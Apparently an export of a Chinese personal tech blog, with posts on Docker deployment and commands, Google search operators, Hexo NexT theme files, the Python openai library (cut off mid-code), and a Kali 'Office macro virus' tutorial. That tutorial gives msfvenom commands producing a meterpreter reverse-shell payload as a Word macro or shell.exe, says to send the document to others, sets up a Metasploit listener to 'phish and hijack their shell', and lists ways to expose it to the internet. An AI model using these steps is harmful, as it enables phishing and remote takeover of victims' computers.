<h3 id="docker-build构建docker镜像"><a href="#docker-build构建docker镜像" class="headerlink" title="docker build构建docker镜像"></a>docker build构建docker镜像</h3><p>在你的项目根目录下（即Dockerfile所在的位置），运行以下命令来构建你的Docker镜像：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> build <span class="token parameter variable">-t</span> your-image-name <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其中 <code>your-image-name</code> 是你给你的Docker镜像起的名字。</p>
<h3 id="docker-run试一下"><a href="#docker-run试一下" class="headerlink" title="docker run试一下"></a>docker run试一下</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">-p</span> <span class="token number">8080</span>:8080 your-image-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>-d</code> 标志表示以”detached”模式（即后台模式）运行容器，<code>-p</code> 标志用于将容器内部的网络端口映射到我们的主机上。在这个例子中，我们将容器的8080端口映射到主机的8080端口。这样你的Python应用就应该在你的本地Windows电脑上以Docker的方式运行起来了。</p>
<h3 id="docker-push推送"><a href="#docker-push推送" class="headerlink" title="docker push推送"></a>docker push推送</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> login
<span class="token function">docker</span> tag your-image-name:latest your-dockerhub-username/your-image-name:latest
<span class="token function">docker</span> push your-dockerhub-username/your-image-name:latest
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>注意将 <code>your-dockerhub-username</code> 和 <code>your-image-name</code> 替换成你的Docker Hub用户名和你的镜像名。</p>
<p>到此你的镜像就构建完成并上传到dockerhub了, 其它设备可以方便地构建容器</p>
<h3 id="在Ubuntu云服务器上部署Docker容器"><a href="#在Ubuntu云服务器上部署Docker容器" class="headerlink" title="在Ubuntu云服务器上部署Docker容器"></a>在Ubuntu云服务器上部署Docker容器</h3><p>(假设你没有在ubuntu上安装Docker)</p>
<ul>
<li><p>首先，你需要在Ubuntu服务器上安装Docker。登录到你的Ubuntu服务器，然后运行以下命令来安装Docker：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update
<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> apt-transport-https ca-certificates <span class="token function">curl</span> software-properties-common
<span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://download.docker.com/linux/ubuntu/gpg <span class="token operator">|</span> <span class="token function">sudo</span> apt-key <span class="token function">add</span> -
<span class="token function">sudo</span> add-apt-repository <span class="token string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="token variable"><span class="token variable">$(</span>lsb_release <span class="token parameter variable">-cs</span><span class="token variable">)</span></span> stable"</span>
<span class="token function">sudo</span> <span class="token function">apt-get</span> update
<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> docker-ce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>从Docker Hub上拉取你的Docker镜像并运行：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull your-dockerhub-username/your-image-name:latest
<span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">-p</span> <span class="token number">8080</span>:8080 your-dockerhub-username/your-image-name:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>注意将 <code>your-dockerhub-username</code> 和 <code>your-image-name</code> 替换成你的Docker Hub用户名和你的镜像名。也可以不开端口, 就不要-p参数</p>
</li>
</ul>
<h4 id="cron"><a href="#cron" class="headerlink" title="cron"></a>cron</h4><p>顺便再讲一下Ubuntu上定时运行程序的一个工具</p>
<p>在Ubuntu上定时运行Docker容器，可以利用cron来实现。以下是操作步骤：</p>
<ol>
<li><p>打开crontab编辑器：</p>
<p>在终端输入<code>crontab -e</code>命令。如果是第一次运行这个命令，系统可能会让你选择一个编辑器（比如nano或vim）。</p>
</li>
<li><p>添加一个cron任务：</p>
<p>在crontab编辑器中，你可以添加一行来定义你的定时任务。每一行代表一个定时任务，格式如下：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">*     <span class="token operator">*</span>     <span class="token operator">*</span>   <span class="token operator">*</span>    <span class="token operator">*</span>        command to be executed
<span class="token operator">-</span>     <span class="token operator">-</span>     <span class="token operator">-</span>   <span class="token operator">-</span>    <span class="token operator">-</span>
|     |     |   |    |
|     |     |   |    +----- day of the week <span class="token punctuation">(</span>0 <span class="token operator">-</span> 6<span class="token punctuation">)</span> <span class="token punctuation">(</span>Sunday=0<span class="token punctuation">)</span>
|     |     |   +------- month <span class="token punctuation">(</span>1 <span class="token operator">-</span> 12<span class="token punctuation">)</span>
|     |     +--------- day of the month <span class="token punctuation">(</span>1 <span class="token operator">-</span> 31<span class="token punctuation">)</span>
|     +----------- hour <span class="token punctuation">(</span>0 <span class="token operator">-</span> 23<span class="token punctuation">)</span>
+------------- min <span class="token punctuation">(</span>0 <span class="token operator">-</span> 59<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>例如，如果你想每天的凌晨1点运行你的Docker容器，你可以添加以下行：</p>
<pre class="line-numbers language-none"><code class="language-none">0 1 * * * &#x2F;usr&#x2F;bin&#x2F;docker run --rm your-image-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这行命令的意思是在每天的1点0分（即每天凌晨1点）执行<code>/usr/bin/docker run --rm your-image-name</code>命令。<code>--rm</code>选项意味着每次运行完容器后删除容器，这通常在你不需要保留容器运行结果时使用。</p>
<p>注意：请将<code>your-image-name</code>替换为你的实际Docker镜像名称。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker常见命令</title>
    <url>/2023/06/30/docker%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<ol>
<li><p>docker –version</p>
</li>
<li><p>docker search</p>
<p>通过 Docker hub 搜索特定镜像。该命令返回具体信息，包括图像名称、描述、自动化、官方星级等。以下是如何使用它 - </p>
<pre class="line-numbers language-none"><code class="language-none">docker search MySQL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>您可以使用 Docker Hub 网站来搜索基于 GUI 的选项。</p>
</li>
<li><p>docker pull</p>
<p>从 Docker Hub 中提取特定的映像。您所要做的就是使用命令“docker pull”以及图像名称</p>
</li>
<li><p>docker run</p>
<p>该命令用于从镜像创建容器。具体做法如下——</p>
<pre class="line-numbers language-none"><code class="language-none">docker run --env MYSQL_ROOT_PASSWORD&#x3D;my-secret-pw --detach mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>‘–detach’ 选项运行容器，’–env’ 选项用于设置强制变量。如果不使用“–name”选项，docker会随机为容器分配一个名称。</p>
</li>
<li><p>docker ps</p>
<p>该命令用于列出后台所有正在运行的容器</p>
<pre class="line-numbers language-none"><code class="language-none">docker ps --all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>docker stop</p>
<p>“docker stop”命令使用容器名称或其 ID 停止容器。具体做法如下——</p>
<pre class="line-numbers language-none"><code class="language-none">docker stop f8c52bedeecc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>docker restart</p>
<p>该命令用于重新启动已停止的容器。<strong>建议重启系统后使用</strong>。具体做法如下——</p>
<pre class="line-numbers language-none"><code class="language-none">greatlearning@greatlearning:&#x2F;home&#x2F;greatlearning$
docker restart f8c52bedeecc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li><p>docker kill</p>
<p>该命令用于通过终止容器的执行来立即停止容器。虽然“docker stop”命令有助于在自己的时间关闭容器，<strong>但“docker Kill”命令会立即停止它</strong>。这里是使用它——</p>
<pre class="line-numbers language-none"><code class="language-none">greatlearning@greatlearning:&#x2F;home&#x2F;greatlearning$
docker kill 09ca6feb6efc
To check whether the container is stopped or killed, use the following command -
greatlearning@greatlearning:&#x2F;home&#x2F;greatlearning$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>docker exec</p>
<p>该命令用于访问正在运行的容器。以下是如何使用它 –</p>
<pre class="line-numbers language-none"><code class="language-none">docker exec -it test_db bash
mysql -uroot -pmy-secret-pw
SHOW DATABASES;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>您必须提供容器的名称或 ID，在本例中为“test_db”。**’-i’ 和 ‘-t’ 选项用于访问交互模式。** </p>
</li>
<li><p>docker login 登录dockerhub</p>
</li>
<li><p>docker commit</p>
<p>该命令用于在本地系统上创建或保存编辑后的容器的映像。 </p>
</li>
<li><p>docker push</p>
<p>此命令有助于在存储库或 docker hub 上推送或上传 docker 镜像</p>
</li>
<li><p>docker network</p>
<p>“docker network”命令用于了解集群中网络列表的详细信息。</p>
</li>
<li><p>Docker rmi </p>
<p>该命令用于释放一些磁盘空间。图像 ID 用于在使用此命令时删除图像。</p>
<pre class="line-numbers language-none"><code class="language-none">docker rmi eb0e825dc3cf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>docker copy</p>
<p>此命令将文件从 docker 复制到本地系统</p>
</li>
<li><p>docker log</p>
</li>
<li><p>docker logout: 退出dockerhub</p>
</li>
</ol>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>google搜索技巧</title>
    <url>/2023/01/29/google%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p> 用了这么多年搜索引擎了, 现在才发现有这么多高级搜索技巧可以让我们搜到自己心中所想</p>
<h2 id="精确搜索-双引号"><a href="#精确搜索-双引号" class="headerlink" title="精确搜索:双引号"></a>精确搜索:双引号</h2><p>完全的匹配你所要的词</p>
<img data-src="/2023/01/29/google搜索技巧/1.png" style="zoom:70%;">

<h2 id="站内搜索-site"><a href="#站内搜索-site" class="headerlink" title="站内搜索:site"></a>站内搜索:site</h2><p><code>site:后面加上你要搜索的网站地址</code>, 表示在这个网站站内搜索</p>
<p>比如 <code>site:stackoverflow.com</code>就是在StackOverflow里搜索(但是感觉作用不大, 因为StackOverflow网站里本来就可以搜索lol)</p>
<p>比如搜索 <code>python哈哈哈 site:stackoverflow.com</code></p>
<h2 id="筛选语言-时间"><a href="#筛选语言-时间" class="headerlink" title="筛选语言\时间"></a>筛选语言\时间</h2><p>点击Tools, 即可筛选</p>
<img data-src="/2023/01/29/google搜索技巧/2.PNG" style="zoom:70%;">

<p>ps: 今天是Bubble Tea Day, Google的界面好好看</p>
<h2 id="通配符搜索"><a href="#通配符搜索" class="headerlink" title="通配符搜索 *"></a>通配符搜索 *</h2><p>这里的用法就很像正则表达式了</p>
<p>比如我想搜一句诗歌, 春眠不觉晓, “不觉”俩字忘了(这是可能的吗lol)</p>
<p>这时我就可以搜索 <code>春眠**晓</code></p>
<h2 id="排除关键字"><a href="#排除关键字" class="headerlink" title="排除关键字 -"></a>排除关键字 -</h2><p>假设你的搜索内容是 &#x3D;&gt; <strong>how to write components in React -class</strong>（如何编写React组件 -class），返回的搜索结果会不包含“class”</p>
<h2 id="文档搜索-filetype"><a href="#文档搜索-filetype" class="headerlink" title="文档搜索 filetype"></a>文档搜索 filetype</h2><p>返回你搜索的文档的相应格式</p>
<p>比如我想搜索三国演义这本书的pdf(如果有的话), 搜索 <code>三国演义 filetype:pdf</code>, 用这个命令搜索一些资料非常方便</p>
<h2 id="搜索特定大小的图片-imagesize"><a href="#搜索特定大小的图片-imagesize" class="headerlink" title="搜索特定大小的图片 imagesize"></a>搜索特定大小的图片 imagesize</h2><p>尺寸仅以 <strong>pixels</strong> 为单位 – 例如：<code>imagesize:500x500</code>的搜索结果是尺寸为 500px x 500px的图片。 所以如果搜索查询是 &#x3D;&gt; “cute dog images imagesize:500x600”（可爱小狗图片 imagesize：500*600）的搜索结果是尺寸为 <code>500px x 600px</code>的可爱小狗的图片</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Google高级搜索和命令行有点相似, 不过google是内容在前, 然后空格, 命令在后. Anyway, 这很容易就能掌握</p>
<hr>
<p>PS: 有些人没有办法访问Google, 但是上述的命令对于baidu同样适用哦. 搜索愉快!</p>
]]></content>
      <categories>
        <category>搜索引擎</category>
      </categories>
      <tags>
        <tag>日常</tag>
      </tags>
  </entry>
  <entry>
    <title>kali教程之office宏病毒</title>
    <url>/2023/07/14/kali%E6%95%99%E7%A8%8B%E4%B9%8Boffice%E5%AE%8F%E7%97%85%E6%AF%92/</url>
    <content><![CDATA[<p>kali好久之前就已经安装好了, 当时不知道具体用法. 今天偶然发现kali如此有趣, 于是开一个kali系列的教程.</p>
<p>VBA是基于Visual Basic发展而来的，与Visual Basic具有相似的语言结构。使用VBA可以完成很多事情，基于Excel、Word的VBA小程序不计其数。宏病毒在Word中引入宏之后出现的。目前Office 是较为流行的编辑软件，并且跨越了多种操作系统，宏病毒利用这一点得到了大范围的传播。</p>
<p>构造一个包含宏病毒的Word文件也并不复杂，只要编写一个Auto_Open函数，就可自动引发病毒。 在Word打开这个文件时， 宏病毒会执行， 然后感染其他文件或直接删除其他文件等。Word宏和其他样式存储在模版DOT文件中， 因此总是把Word文件转成模版，再将其存储为宏。</p>
<p>好的, 现在开始教程!</p>
<p>打开kali, 在终端中键入<code>msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.3.51 LPORT=4444 -f vba-exe</code></p>
<p>各参数意义如下:</p>
<ul>
<li>–platform windows - 指定目标平台是Windows</li>
<li>-p windows&#x2F;meterpreter&#x2F;reverse_tcp - 指定使用的payload是meterpreter reverse TCP</li>
<li>LHOST&#x3D;192.168.68.125 - 指定本地监听的IP地址</li>
<li>LPORT&#x3D;4444 - 指定本地监听的端口号</li>
<li>-e x86&#x2F;shikata_ga_nai - 使用shikata_ga_nai编码器对payload进行编码</li>
<li>-f vba-exe - 将payload输出为VBA格式的可执行文件</li>
</ul>
<p>只有操作系统和架构不同的时候需要改一下命令, 对于windows电脑的64位系统, 上面的命令可以直接使用, 键入命令并确认后可以看到如下:</p>
<img data-src="/2023/07/14/kali教程之office宏病毒/1.png" style="zoom:100%;">

<p>我们可以看到由两部分: <code>macro code</code>, 和<code>data</code>.</p>
<p>我们可以将<code>macro</code>制作成宏代码, <code>data</code>需要插入在word文档最后. 你需要保存为启用宏的文档, 后缀为docm</p>
<p>到现在就只做好word文档病毒了. 将文档发给别人, 然后进行如下操作:</p>
<p>在Kali中启动metasploit, 依次键入</p>
<pre class="line-numbers language-none"><code class="language-none">msf6 &gt; use exploit&#x2F;multi&#x2F;handler 
msf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.3.51
msf6 exploit(multi&#x2F;handler) &gt; set lport 4444
msf6 exploit(multi&#x2F;handler) &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后就可以美美钓鱼劫持对方shell啦</p>
<hr>
<p><strong>更新</strong></p>
<p>上面的内容是在局域网中劫持监听, 如果想要监听外网ip, 需要有一台云服务器(kali不必安装在此云服务器上)</p>
<p>使用msfvenom生成的反向连接payload,配合msfconsole的exploit&#x2F;multi&#x2F;handler也可以实现远程外网监听。</p>
<p>主要步骤是:</p>
<ol>
<li>在Kali上使用msfvenom生成payload,设置外网IP作为LHOST:</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;123.123.123.123 LPORT&#x3D;4444 -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li>在Kali上启动handler,设置与payload相同的监听配置:</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
set PAYLOAD windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
set LHOST 123.123.123.123(所有ip换成你自己的公网ip)
set LPORT 4444
exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="3">
<li>将shell.exe传到Windows目标机器运行。 </li>
<li>目标机连接Kali的外网IP和端口,会得到一个反向连接的meterpreter session。</li>
</ol>
<p>这里的关键是:</p>
<ul>
<li>msfvenom设置外网IP作为LHOST</li>
<li>handler同样监听在外网IP上</li>
<li>Kali服务器需要具有外网可访问的IP</li>
<li>需要在防火墙放行对应的端口</li>
</ul>
<p>这样就可以实现通过公网IP来获取meterpreter shell了。</p>
<hr>
<p>再更, 没有云服务器也可以搞, 只需要内网穿透, 反向代理一波</p>
<ol>
<li>在Kali上设置端口转发,将局域网Kali的端口映射到公网服务器的端口,然后在公网服务器上监听转发的端口。</li>
<li>使用内网穿透工具如frp,在Kali上启动frp客户端,在公网服务器上启动frp服务端,实现内网Kali到公网的映射。</li>
<li>使用VPN,在Kali上连接公网服务器的VPN,获得公网IP,然后在Kali本机监听。</li>
<li>使用SSH隧道,通过公网服务器建立SSH隧道到内网Kali,然后Kali Bind到本地端口进行监听。</li>
<li>使用ngrok等内网映射工具,将Kali的某端口映射到公网URL,然后在Kali本机监听即可。</li>
<li>利用DNS解析指向内网Kali,使得目标主机反向连接时找到内网Kali。</li>
</ol>
]]></content>
      <categories>
        <category>计算机病毒</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>next主题源文件说明</title>
    <url>/2023/01/24/next%E4%B8%BB%E9%A2%98%E6%BA%90%E6%96%87%E4%BB%B6%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<p><strong>现在的说明并不全面，本文将在接触到更详细的知识之后随时更新</strong></p>
<p>主题文件夹保存在 <code>BLOG/themes/next</code>里</p>
<ul>
<li><p><code>layout</code>文件夹里保存了博客的布局</p>
<ul>
<li><p><code>_custom</code>里保存了博客的通用布局，主要有鼠标点击特效、禁止复制粘贴、节日弹窗、动态标题等代码</p>
</li>
<li><p><code>_macro</code>是博客宏观布局</p>
<ul>
<li><code>post.swig</code>应该是对博文的排布</li>
<li><code>sidebar.swig</code>是对侧边栏的布局，我自己在这里加了”欢迎来客, 显示地理位置”的功能和查看”访客地图”的功能</li>
</ul>
</li>
<li><p><code>_partials</code>是局部布局</p>
<ul>
<li><code>head</code>文件夹是左上角”一叶小屋”标题的显示</li>
<li><code>header</code>掌管菜单</li>
<li><code>post</code>掌管博文的版权、关注、脚注、打赏等功能的布局</li>
<li><code>search</code>是本地搜索功能</li>
<li><code>sidebar</code>是侧边栏</li>
<li><code>footer.swig</code>是博客的最底部的内容, 比如有备案信息、版权、作者、访客、建站时间等信息</li>
</ul>
</li>
<li><p>_<code>scipts</code></p>
</li>
<li><p><code>_third-party</code>第三方的一些插件</p>
</li>
<li><p><code>_layout.swig</code>这个掌管了整体的布局，很重要</p>
</li>
</ul>
</li>
<li><p><code>sourcce</code></p>
<ul>
<li><code>js</code> 网站自定义功能要用到的js代码主要保存在这<ul>
<li><code>cursor/fireworks.js</code>鼠标点击产生烟花效果</li>
<li><code>my-own-fun-code</code>里面有禁止鼠标右键，腾讯地图插件两个文件</li>
<li><code>special-day</code>特定日子弹窗提醒的代码</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>hexo的next主题</tag>
      </tags>
  </entry>
  <entry>
    <title>python openai库教程</title>
    <url>/2023/03/07/python-openai%E5%BA%93%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h1><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">pip install openai<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="列出模型"><a href="#列出模型" class="headerlink" title="列出模型"></a>列出模型</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> openai
openai<span class="token punctuation">.</span>api_key <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"OPENAI_API_KEY"</span><span class="token punctuation">)</span>
openai<span class="token punctuation">.</span>Model<span class="token punctuation">.</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h1 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h1><h2 id="Create-completion"><a href="#Create-completion" class="headerlink" title="Create completion"></a>Create completion</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> openai
openai<span class="token punctuation">.</span>api_key <span class="token operator">=</span> <span class="token string">''</span>
openai<span class="token punctuation">.</span>Completion<span class="token punctuation">.</span>create<span class="token punctuation">(</span>
  model<span class="token operator">=</span><span class="token string">"gpt-3.5-turbo"</span><span class="token punctuation">,</span>
  prompt<span class="token operator">=</span><span class="token string">"Say this is a test"</span><span class="token punctuation">,</span>
  max_tokens<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span>
  temperature<span class="token operator">=</span><span class="token number">0</span>
<span class="token punctuation">)</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>response</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"cmpl-uqkvlQyYK7bGYrRHQ0eXlWi7"</span><span class="token punctuation">,</span>
  <span class="token property">"object"</span><span class="token operator">:</span> <span class="token string">"text_completion"</span><span class="token punctuation">,</span>
  <span class="token property">"created"</span><span class="token operator">:</span> <span class="token number">1589478378</span><span class="token punctuation">,</span>
  <span class="token property">"model"</span><span class="token operator">:</span> <span class="token string">"text-davinci-003"</span><span class="token punctuation">,</span>
  <span class="token property">"choices"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">&#123;</span>
      <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"\n\nThis is indeed a test"</span><span class="token punctuation">,</span>
      <span class="token property">"index"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
      <span class="token property">"logprobs"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
      <span class="token property">"finish_reason"</span><span class="token operator">:</span> <span class="token string">"length"</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"usage"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"prompt_tokens"</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">,</span>
    <span class="token property">"completion_tokens"</span><span class="token operator">:</span> <span class="token number">7</span><span class="token punctuation">,</span>
    <span class="token property">"total_tokens"</span><span class="token operator">:</span> <span class="token number">12</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>请求参数</p>
<ul>
<li><p><code>model</code></p>
</li>
<li><p><code>prompt</code>: 如果没有, the model will generate as if from the beginning of a new document.</p>
</li>
<li><p><code>suffix</code>: 感觉没啥用</p>
</li>
<li><p><code>max_tokens integer Optional Defaults to 16</code></p>
<p>gpt返回的最大tokens数量, 你的promt的tokens+max_tokens必须小于2048或4096(最新的model)</p>
</li>
<li><p><code>temperature number Optional Defaults to 1</code></p>
<p>range from [0,2], 温度越高, 随机性越强</p>
<p>官方建议, 温度和top_p值改变一个</p>
</li>
<li><p><code>top_p number Optional Defaults to 1</code> 用温度吧, 别用他</p>
</li>
<li><p><code>n int Opt Defau 1</code></p>
<p>对于每个prompt, 产生的completions的条数</p>
</li>
</ul>
<h2 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> openai
openai<span class="token punctuation">.</span>api_key <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"OPENAI_API_KEY"</span><span class="token punctuation">)</span>

completion <span class="token operator">=</span> openai<span class="token punctuation">.</span>ChatCompletion<span class="token punctuation">.</span>create<span class="token punctuation">(</span>
  model<span class="token operator">=</span><span class="token string">"gpt-3.5-turbo"</span><span class="token punctuation">,</span>
  messages<span class="token operator">=</span><span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span><span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> <span class="token string">"You are a helpful assistant."</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> <span class="token string">"Who won the world series in 2020?"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"assistant"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> <span class="token string">"The Los Angeles Dodgers won the World Series in 2020."</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> <span class="token string">"Where was it played?"</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>completion<span class="token punctuation">.</span>choices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>message<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>response</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"chatcmpl-123"</span><span class="token punctuation">,</span>
  <span class="token property">"object"</span><span class="token operator">:</span> <span class="token string">"chat.completion"</span><span class="token punctuation">,</span>
  <span class="token property">"created"</span><span class="token operator">:</span> <span class="token number">1677652288</span><span class="token punctuation">,</span>
  <span class="token property">"choices"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>
    <span class="token property">"index"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token property">"message"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token property">"role"</span><span class="token operator">:</span> <span class="token string">"assistant"</span><span class="token punctuation">,</span>
      <span class="token property">"content"</span><span class="token operator">:</span> <span class="token string">"\n\nHello there, how may I assist you today?"</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token property">"finish_reason"</span><span class="token operator">:</span> <span class="token string">"stop"</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"usage"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"prompt_tokens"</span><span class="token operator">:</span> <span class="token number">9</span><span class="token punctuation">,</span>
    <span class="token property">"completion_tokens"</span><span class="token operator">:</span> <span class="token number">12</span><span class="token punctuation">,</span>
    <span class="token property">"total_tokens"</span><span class="token operator">:</span> <span class="token number">21</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在 Python 中，可以使用 提取助手的回复<code>response[‘choices’][0][‘message’][‘content’]</code></p>
<p>  一般来说，<code>gpt-3.5-turbo-0301</code>对系统消息的关注度不高，因此重要的说明往往放在用户消息中比较好。</p>
<h2 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h2><p>给定提示和指令，模型将返回提示的编辑版本。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> openai
openai<span class="token punctuation">.</span>api_key <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"OPENAI_API_KEY"</span><span class="token punctuation">)</span>
openai<span class="token punctuation">.</span>Edit<span class="token punctuation">.</span>create<span class="token punctuation">(</span>
